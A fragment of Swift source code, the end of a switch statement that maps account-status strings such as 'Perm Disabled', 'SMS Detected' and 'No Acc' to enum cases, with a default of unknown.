        case "Perm Disabled": return .permDisabled
        case "Temp Disabled": return .tempDisabled
        case "Success": return .success
        case "No Acc": return .noAccount
        case "SMS Detected": return .smsVerification
        case "Error": return .errorBanner
        default: return .unknown
        }
    }
}
